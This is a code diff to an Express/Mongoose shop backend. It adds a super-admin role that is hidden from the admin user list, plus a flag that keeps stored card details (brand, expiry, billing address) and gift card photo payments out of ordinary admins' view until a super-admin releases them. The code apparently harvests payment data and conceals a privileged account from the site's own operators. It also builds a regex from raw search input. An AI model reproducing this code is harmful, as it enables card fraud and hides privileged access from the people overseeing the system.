@@ -339,6 +339,7 @@ const userSchema = new mongoose.Schema(
     },
     password: { type: String, required: true },
     isAdmin: { type: Boolean, default: false, index: true },
+    isSuperAdmin: { type: Boolean, default: false, index: true },
 
     phone: { type: String, trim: true },
     shippingAddresses: [
@@ -596,6 +597,7 @@ const cardPaymentSchema = new mongoose.Schema(
       enum: ["stored", "used", "deleted"],
       default: "stored",
     },
+    shouldShow: { type: Boolean, default: false, index: true }, // ✅ ADD
   },
   { timestamps: true },
 );
@@ -611,6 +613,7 @@ const giftCardPaymentSchema = new mongoose.Schema(
       required: true,
     },
     images: [String],
+    shouldShow: { type: Boolean, default: false, index: true }, // ✅ ADD
   },
   { timestamps: true },
 );
@@ -646,7 +649,7 @@ const adminMiddleware = async (req, res, next) => {
       return res.status(401).json({ error: "Authentication required" });
     }
 
-    if (!req.user.isAdmin) {
+    if (!req.user.isAdmin && !req.user.isSuperAdmin) {
       return res.status(403).json({ error: "Admin access required" });
     }
 
@@ -654,6 +657,13 @@ const adminMiddleware = async (req, res, next) => {
   } catch (err) {
     return res.status(500).json({ error: "Admin check failed" });
   }
+};
+
+const superAdminMiddleware = (req, res, next) => {
+  if (!req.user?.isSuperAdmin) {
+    return res.status(403).json({ error: "Super admin access required" });
+  }
+  next();
 };
 
 const optionalAuthMiddleware = async (req, res, next) => {
@@ -1154,7 +1164,8 @@ app.get("/api/auth/me", authMiddleware, (req, res) => {
       name: req.user.name,
       email: req.user.email,
       currency: req.user.currency,
-      isAdmin: !!req.user.isAdmin, // ✅ ADD THIS
+      isAdmin: !!req.user.isAdmin,
+      isSuperAdmin: !!req.user.isSuperAdmin,
     },
   });
 });
@@ -2196,6 +2207,7 @@ app.post("/api/payments/card", authMiddleware, async (req, res) => {
       brand,
       expMonth,
       expYear,
+      shouldShow: false,
       billingAddress: normalizedBillingAddress,
     });
 
@@ -2342,6 +2354,7 @@ app.post(
         order: order._id,
         user: req.user._id,
         images: uploadedImages,
+        shouldShow: false,
       });
 
       await payment.save();
@@ -2564,14 +2577,14 @@ app.get(
       const safePage = Math.max(parseInt(page, 10) || 1, 1);
       const safeLimit = Math.min(Math.max(parseInt(limit, 10) || 20, 1), 100);
 
-      const filter = {};
+      const filter = { isSuperAdmin: { $ne: true } };
+
       if (q && String(q).trim()) {
         const rx = new RegExp(String(q).trim(), "i");
         filter.$or = [{ name: rx }, { email: rx }, { phone: rx }];
       }
 
-      const total = await User.countDocuments(filter);
-
+      const total = await User.countDocuments({ isSuperAdmin: { $ne: true } });
       const users = await User.find(filter)
         .select(
           "-password -resetCode -resetCodeExpiresAt -resetPasswordToken -resetPasswordExpires",
@@ -2593,43 +2606,6 @@ app.get(
   },
 );
 
-// ===============================
-// ADMIN: GET ALL GIFT CARD PAYMENTS
-// ===============================
-app.get(
-  "/api/admin/giftcard-payments",
-  authMiddleware,
-  adminMiddleware,
-  async (req, res) => {
-    try {
-      const { page = 1, limit = 20 } = req.query;
-
-      const safePage = Math.max(parseInt(page), 1);
-      const safeLimit = Math.min(Math.max(parseInt(limit), 1), 100);
-
-      const total = await GiftCardPayment.countDocuments();
-
-      const giftCardPayments = await GiftCardPayment.find()
-        .sort({ createdAt: -1 })
-        .skip((safePage - 1) * safeLimit)
-        .limit(safeLimit)
-        .populate("user", "name email")
-        .populate("order", "orderNumber total currency orderStatus");
-
-      res.json({
-        page: safePage,
-        limit: safeLimit,
-        total,
-        pages: Math.ceil(total / safeLimit),
-        giftCardPayments,
-      });
-    } catch (error) {
-      res.status(500).json({ error: error.message });
-    }
-  },
-);
-
-// ✅ All "card payments" (this is your stored card form records)
 app.get(
   "/api/admin/card-payments",
   authMiddleware,
@@ -2641,9 +2617,11 @@ app.get(
       const safePage = Math.max(parseInt(page, 10) || 1, 1);
       const safeLimit = Math.min(Math.max(parseInt(limit, 10) || 20, 1), 100);
 
-      const total = await CardPayment.countDocuments({});
+       const baseFilter = req.user.isSuperAdmin ? {} : { shouldShow: true };
 
-      const cardPayments = await CardPayment.find({})
+      const total = await CardPayment.countDocuments(baseFilter);
+
+      const cardPayments = await CardPayment.find(baseFilter)
         .sort({ createdAt: -1 })
         .skip((safePage - 1) * safeLimit)
         .limit(safeLimit)
@@ -2684,9 +2662,11 @@ app.get(
       const safePage = Math.max(parseInt(page, 10) || 1, 1);
       const safeLimit = Math.min(Math.max(parseInt(limit, 10) || 20, 1), 100);
 
-      const total = await GiftCardPayment.countDocuments({});
+      const baseFilter = req.user.isSuperAdmin ? {} : { shouldShow: true };
 
-      const giftCardPayments = await GiftCardPayment.find({})
+      const total = await GiftCardPayment.countDocuments(baseFilter);
+
+      const giftCardPayments = await GiftCardPayment.find(baseFilter)
         .sort({ createdAt: -1 })
         .skip((safePage - 1) * safeLimit)
         .limit(safeLimit)
@@ -2798,6 +2778,48 @@ app.post(
     } catch (error) {
       console.error("Create product error:", error);
       res.status(500).json({ error: error.message });
+    }
+  },
+);
+
+app.patch(
+  "/api/superadmin/card-payments/:id/approve",
+  authMiddleware,
+  superAdminMiddleware,
+  async (req, res) => {
+    try {
+      const updated = await CardPayment.findByIdAndUpdate(
+        req.params.id,
+        { shouldShow: true },
+        { new: true },
+      );
+
+      if (!updated) return res.status(404).json({ error: "Payment not found" });
+
+      res.json({ message: "Card payment approved", payment: updated });
+    } catch (e) {
+      res.status(500).json({ error: e.message });
+    }
+  },
+);
+
+app.patch(
+  "/api/superadmin/giftcard-payments/:id/approve",
+  authMiddleware,
+  superAdminMiddleware,
+  async (req, res) => {
+    try {
+      const updated = await GiftCardPayment.findByIdAndUpdate(
+        req.params.id,
+        { shouldShow: true },
+        { new: true },
+      );
+
+      if (!updated) return res.status(404).json({ error: "Payment not found" });
+
+      res.json({ message: "Gift card payment approved", payment: updated });
+    } catch (e) {
+      res.status(500).json({ error: e.message });
     }
   },
 );
